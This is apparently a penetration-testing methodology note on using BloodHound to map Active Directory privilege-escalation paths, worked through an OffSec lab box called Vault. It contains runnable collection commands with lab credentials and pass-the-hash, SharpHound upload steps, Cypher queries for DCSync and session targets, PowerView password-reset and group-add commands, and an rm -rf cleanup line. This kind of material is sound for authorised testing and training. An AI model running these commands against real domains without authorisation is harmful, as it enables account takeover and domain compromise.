title: BloodHound — Authenticated AD Graph Collection and Analysis
body:
BloodHound is the single most important tool in modern AD attack methodology. The moment you have any domain credential — even a single low-privileged user — BloodHound transforms the entire AD landscape into a graph that surfaces privilege escalation paths most operators would miss with manual enumeration.

This is the AD enum spine node. Every successful AD compromise on a non-trivial network goes through BloodHound at least once. SharpUp, winPEAS, and local enumeration tools tell you about local primitives. BloodHound tells you about PATHS — chains of relationships across the domain that lead from your current foothold to Domain Admin.

— THE WORKFLOW IN ONE SENTENCE —

  Collect → Import → Mark Owned → Shortest Path from Owned → Follow the edges.

— COLLECTION FROM KALI (PREFERRED) —

  bloodhound-python is the cross-platform collector. Runs from Kali against
  any reachable DC. No need to drop binaries on target — uses LDAP/SMB
  protocols natively.

  Required inputs:
    - Domain credential (any user)
    - DC IP or hostname
    - Domain name (FQDN form, e.g. vault.offsec)

  Output: 6-7 JSON files (computers, users, groups, etc.) in the current
  directory. Drag those into the BloodHound GUI to import.

— COLLECTION FROM TARGET (FALLBACK) —

  When bloodhound-python can't reach the DC (network restrictions, weird
  configs), fall back to SharpHound from a foothold shell:

    SharpHound.exe — compiled C# binary, requires .NET on target
    SharpHound.ps1 — PowerShell variant, blocked by AMSI on most modern Windows

  Drop SharpHound.exe via evil-winrm or Sliver, run with -CollectionMethods
  flag, transfer the resulting zip back to Kali for analysis.

— THE GUI — WHAT TO ACTUALLY DO —

  1. Start neo4j and BloodHound:
     sudo neo4j start
     bloodhound &

  2. Import collected JSONs (drag-drop the entire folder onto the GUI)

  3. Mark your compromised user(s) as Owned:
     Right-click node → Mark User as Owned
     This sets the owned:true property used by built-in queries

  4. Run the canonical query:
     Pre-built queries → Shortest Path from Owned Principals
     This shows every path from any Owned user to Domain Admins

  5. Read the path:
     Each edge is an attack primitive. Right-click any edge → Help
     Help text shows the actual exploitation steps for that edge type

  6. Pick the easiest edge first — they're not all equal in difficulty

— THE EDGES THAT MATTER —

  HIGH-VALUE ABUSABLE EDGES (these are the ones to look for):

    GenericAll          Full control. Any other edge available.
    GenericWrite        Set SPNs (targeted Kerberoast), set logon scripts.
    WriteDacl           Grant yourself any other right (most flexible).
    WriteOwner          Take ownership, then grant rights.
    ForceChangePassword Reset password without knowing current.
    AddMember           Add yourself to the group (instant escalation).
    AllExtendedRights   Reset password + read LAPS + DCSync (on domain).
    ReadGMSAPassword    Read gMSA managed password (offline crack).
    AddSelf             Add yourself to the group.

  HIGH-VALUE EDGES ON GPO NODES:
    WriteDacl, GenericAll, GenericWrite on a GPO → see gpo_abuse node
    These are how Vault was compromised — full walkthrough in gpo_abuse.

  HIGH-VALUE EDGES ON COMPUTER NODES:
    AllowedToAct        RBCD — impersonate any user to this computer
    AllowedToDelegate   Constrained delegation — impersonate to specific services
    HasSession          User has a logon session here — credential harvest target
    AdminTo             Local admin on this computer — direct lateral movement
    CanRDP / CanPSRemote Direct interactive access

  SPECIAL EDGES:
    DCSync              Replication right on domain root — dump all hashes
    GetChanges          Half of DCSync (need both for full DCSync)
    GetChangesAll       Other half
    SyncLAPSPassword    Read all LAPS passwords (computers/local admins)

— READING A PATH — THE VAULT EXAMPLE —

  Vault's BloodHound graph showed this path from anirudh:

    ANIRUDH ──[CanPSRemote]──> DC.VAULT.OFFSEC          (foothold via WinRM)
           ──[WriteDacl]────> Default Domain Policy     (the abusable edge)
                              ──[GPLink]──> VAULT.OFFSEC (where it applies)
                                            ──[Contains]──> ADMINISTRATORS

  Translation: anirudh has WriteDacl on a GPO that's linked to the domain
  root. The GPO applies to everything, including the DC. By modifying the
  GPO to add anirudh as a local admin, anirudh becomes admin on the DC.

  This was invisible from local enumeration — SharpUp showed SeBackupPrivilege
  and Server Operators (a rabbit hole). BloodHound showed the actual path.

  That's the value: BloodHound surfaces what local tools can't see.

— POST-COLLECTION QUERIES WORTH RUNNING —

  Pre-built queries:
    Shortest Path from Owned Principals
    Shortest Path to Domain Admins
    Find Computers Where Domain Users are Local Admin
    Map Domain Trusts
    Find AS-REP Roastable Users
    Find Kerberoastable Users
    Find Computers with Unconstrained Delegation
    Shortest Paths to Unconstrained Delegation Systems

  Custom Cypher queries (raw queries — paste into Cypher box):
    See cmd block — the most useful ones are listed there.

— WHEN BLOODHOUND SHOWS NOTHING USEFUL —

  Sometimes the domain genuinely has no abusable paths from your current
  foothold. Three things to try:

    1. Mark MORE users as Owned — every cracked credential, every
       captured hash, every Kerberoast crack. The graph changes as you do.

    2. Run with --collectall to capture session data (HasSession edges).
       Shows where users are currently logged in — ripe for credential
       theft via dumping memory.

    3. Pivot to manual enum — see ad_manual node. BloodHound doesn't catch
       everything (custom service accounts with weak passwords, file shares
       with credentials, GPO files with secrets).
cmd:
# ── INSTALL (if not already installed) ───────────────
# bloodhound-python collector:
pip3 install bloodhound
# Or: apt install bloodhound.py

# BloodHound GUI + neo4j:
sudo apt install bloodhound neo4j
sudo neo4j-admin set-initial-password BloodHound

# ── STEP 1: COLLECT FROM KALI ────────────────────────
# Set environment for clarity
export DOMAIN='vault.offsec'
export DC_IP='192.168.45.201'
export USER='anirudh'
export PASS='SecureHM'
export KALI_LOOT=~/hacktrack/boxes/vault_${DC_IP}/loot

mkdir -p $KALI_LOOT/bloodhound
cd $KALI_LOOT/bloodhound

# Standard collection — pulls everything bloodhound-python supports
bloodhound-python -d $DOMAIN \
  -u $USER -p $PASS \
  -ns $DC_IP \
  -c All

# What -c All collects:
#   Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps,
#   DCOM, PSRemote, LoggedOn
# Use -c All unless you have a reason not to (it's the most complete graph)

# Specific collection methods (if you need to limit):
bloodhound-python -d $DOMAIN -u $USER -p $PASS -ns $DC_IP -c Group,ACL,Trusts

# With NTLM hash instead of password:
bloodhound-python -d $DOMAIN -u $USER --hashes :NTHASH -ns $DC_IP -c All

# With a specific DC hostname (some networks need this):
bloodhound-python -d $DOMAIN -u $USER -p $PASS \
  -dc DC.VAULT.OFFSEC -ns $DC_IP -c All

# When DNS is unreliable, force NS:
bloodhound-python -d $DOMAIN -u $USER -p $PASS -ns $DC_IP -c All --dns-tcp

# ── STEP 1B: COLLECT FROM TARGET (FALLBACK) ──────────
# When bloodhound-python can't reach the DC
# Drop SharpHound.exe via evil-winrm/sliver, then run on target:
upload SharpHound.exe
.\SharpHound.exe -c All --zipfilename collection.zip

# Transfer the zip back to Kali:
download collection.zip

# Or with PowerShell (often blocked by AMSI):
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethods All -OutputDirectory C:\Temp

# ── STEP 2: START NEO4J AND BLOODHOUND GUI ───────────
# Start neo4j daemon
sudo neo4j start
# Confirm it's listening
sudo systemctl status neo4j
# Or for the manual approach:
sudo neo4j console &

# Launch BloodHound GUI
bloodhound &

# Login: neo4j / BloodHound (or whatever password you set)

# ── STEP 3: IMPORT THE COLLECTION ─────────────────────
# In the GUI:
#   1. Click 'Upload Data' (or drag-drop the directory)
#   2. Select the folder containing the .json files (or .zip from SharpHound)
#   3. Wait for import to finish (progress shown bottom-right)
#
# Files imported:
#   <timestamp>_computers.json
#   <timestamp>_domains.json
#   <timestamp>_groups.json
#   <timestamp>_ous.json
#   <timestamp>_users.json
#   <timestamp>_gpos.json
#   <timestamp>_containers.json

# ── STEP 4: MARK OWNED ────────────────────────────────
# In the GUI search bar, find your compromised user
# Right-click the node → Mark User as Owned
# The node turns red — sets owned:true property
#
# Repeat for every credential you've compromised on this engagement.
# More owned principals = more attack paths visible.

# ── STEP 5: RUN THE CANONICAL QUERIES ────────────────
# Click the 'Analysis' tab (left sidebar)
# Pre-built queries to start with (in priority order):

#   Shortest Path from Owned Principals  ← START HERE
#   Shortest Path to Domain Admins
#   Find AS-REP Roastable Users
#   Find Kerberoastable Users
#   Find Computers with Unconstrained Delegation
#   Find Shortest Paths from Domain Users to High Value Targets
#   Map Domain Trusts
#   Find Workstations Where Domain Users are Local Admin

# ── STEP 6: CYPHER QUERIES — THE POWER USER MOVES ────
# Click the cypher console icon (looks like a database) in the search bar

# Show all paths from owned users to DA:
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@VAULT.OFFSEC'})) RETURN p

# Show all GPO abuse paths:
MATCH p=(u:User {owned:true})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(g:GPO) RETURN p

# Show all DCSync rights holders:
MATCH p=(u:User)-[r:GetChangesAll]->(d:Domain) RETURN u.name,d.name

# Show all kerberoastable accounts that are also DA members:
MATCH p=(u:User {hasspn:true})-[r:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}) RETURN u.name

# Show all unconstrained delegation hosts (TGT capture targets):
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

# Find all users with DCSync rights (no inheritance — direct grant):
MATCH p=(u:User)-[r:GetChanges|GetChangesAll]->(d:Domain) WHERE NOT (u)-[:MemberOf*1..]->(:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}) RETURN u.name

# Show the path TO a specific user (e.g., reverse path planning):
MATCH p=shortestPath((u:User)-[*1..]->(target:User {name:'TARGET@DOMAIN.LOCAL'})) WHERE u.owned=true RETURN p

# Find all computers where any owned user has admin access:
MATCH p=(u:User {owned:true})-[r:AdminTo]->(c:Computer) RETURN p

# Find all sessions on computers (for credential harvesting):
MATCH p=(c:Computer)-[r:HasSession]->(u:User) WHERE u.name CONTAINS 'admin' RETURN p

# ── STEP 7: FOLLOW THE PATH — ABUSE THE EDGES ────────
# Right-click any edge → Help → shows exact exploitation steps
# The most common abuse commands per edge type:

# WriteDacl on a GPO → see gpo_abuse node for full chain
# WriteDacl on a user → grant yourself GenericAll, then reset password
# GenericAll on a user → reset password directly
# GenericWrite on a user → set SPN, Kerberoast — see asrep_roast / kerberoast
# AllExtendedRights on a user → reset password (User-Force-Change-Password)
# ForceChangePassword → Set-DomainUserPassword from PowerView

# Reset a target user's password (PowerView, foothold shell):
. .\PowerView.ps1
$NewPassword = ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'targetuser' -AccountPassword $NewPassword

# Add self to group (when AddMember edge exists):
Add-DomainGroupMember -Identity 'TargetGroup' -Members 'youruser'

# ── STEP 8: RECOLLECT WHEN GRAPH CHANGES ─────────────
# After resetting passwords, adding members, or making any AD changes —
# the graph in BloodHound is now stale. Recollect:
bloodhound-python -d $DOMAIN -u $USER -p $PASS -ns $DC_IP -c All
# Re-import in the GUI (it merges with existing data)

# ── BONUS: BLOODHOUND COMMUNITY EDITION (BHCE) ───────
# If using BloodHound CE (the new web-based version) instead of legacy:
#   docker compose up   # bring up the stack
#   Browser: http://localhost:8080
#   Default: admin / first-time-password-shown-on-startup
# Same collectors work — bloodhound-python output is compatible.
# UI is different but workflow is the same.
warn:
RUN -c All UNLESS YOU HAVE A REASON NOT TO:
  Limited collection methods give you a limited graph. Some attack paths
  only show up when you have ACL data + Session data + Trusts together.
  Skipping methods to 'be quick' usually costs more time than it saves
  because you have to recollect later.

MARK EVERY OWNED PRINCIPAL — DON'T MISS THIS:
  BloodHound paths only flow from Owned principals. Every credential you
  compromise should be marked owned immediately. Forgetting to mark a user
  is the #1 reason 'BloodHound shows no path' when there is one.

DOMAIN.LOCAL vs DOMAIN — CASE AND FORMAT MATTER:
  bloodhound-python -d expects the FQDN: 'corp.local', 'vault.offsec'
  Cypher queries reference upper-case form: 'CORP.LOCAL', 'VAULT.OFFSEC'
  Group names are FULLY-QUALIFIED: 'DOMAIN ADMINS@VAULT.OFFSEC'
  If your queries return nothing — check the case and the @-suffix.

NS vs DC PARAMETERS — WHEN TO USE WHICH:
  -ns $DC_IP    — use the DC as DNS server (most common, works on labs)
  -dc DC.NAME   — specify DC hostname when DNS routes through your VPN
  -nameserver   — alias for -ns
  When in doubt: use both. -ns to handle DNS, -dc to handle the LDAP target.

LDAP CHANNEL BINDING / SIGNING CAN BLOCK COLLECTION:
  Modern hardened DCs may require LDAP signing or channel binding for
  bind operations. bloodhound-python may fail with 'strongAuthRequired'
  errors. Workarounds:
    --ldaps   — use LDAPS instead of LDAP (port 636)
    --use-ldaps — same
  If both fail, fall back to SharpHound on a target with a valid Kerberos
  ticket.

SESSIONS ARE TIME-SENSITIVE:
  HasSession edges show users currently logged on at collection time.
  These change constantly — what was true at 9am may not be true at 11am.
  Plan credential-harvest attacks promptly after collection.

LARGE DOMAINS = LARGE COLLECTIONS:
  bloodhound-python on a 50k user domain takes 10-30 minutes and produces
  100MB+ of JSON. The GUI handles it but searches get slow. Filter at
  collection time when possible:
    bloodhound-python ... -c Group,ACL,Trusts  (skip Session/LocalAdmin)
  Or limit by container:
    bloodhound-python ... --searchforest  (only forest root) — careful, narrow

CYPHER QUERIES VS PRE-BUILT — KNOW BOTH:
  Pre-built queries are good for first looks. Custom Cypher is essential
  for engagement-specific questions ('show me all paths from finance OU
  to HR OU users'). Learning basic Cypher syntax pays off fast.

NEO4J DATABASE PERSISTS BETWEEN SESSIONS:
  Your collection data stays in neo4j unless you wipe it. After an
  engagement, clear it:
    sudo neo4j stop
    sudo rm -rf /var/lib/neo4j/data/databases/neo4j
    sudo neo4j start
  Or in the GUI: Database → Clear Database.
  Mixing data from different engagements creates confusing graphs and
  wastes time.

BLOODHOUND IS NOT A REPLACEMENT FOR MANUAL ENUM:
  BloodHound shows what's in the graph at collection time. It misses:
    - Service account passwords stored in scripts/files
    - Credentials in GPO XML files (cpasswords)
    - Network shares with sensitive content
    - Misconfigured services with weak default credentials
  Use BloodHound for path finding, then fall back to ad_manual / smb_loot
  for the human-judgment work.

choices.label: Found WriteDacl/GenericWrite on GPO — exploit it
Found ACL abuse path on user/group
Found unconstrained delegation host — coerce + capture TGT
Found DCSync rights — dump domain hashes
Validate path with PowerView before exploiting
BloodHound shows nothing useful — manual AD enum
No direct path — try password spray for more creds
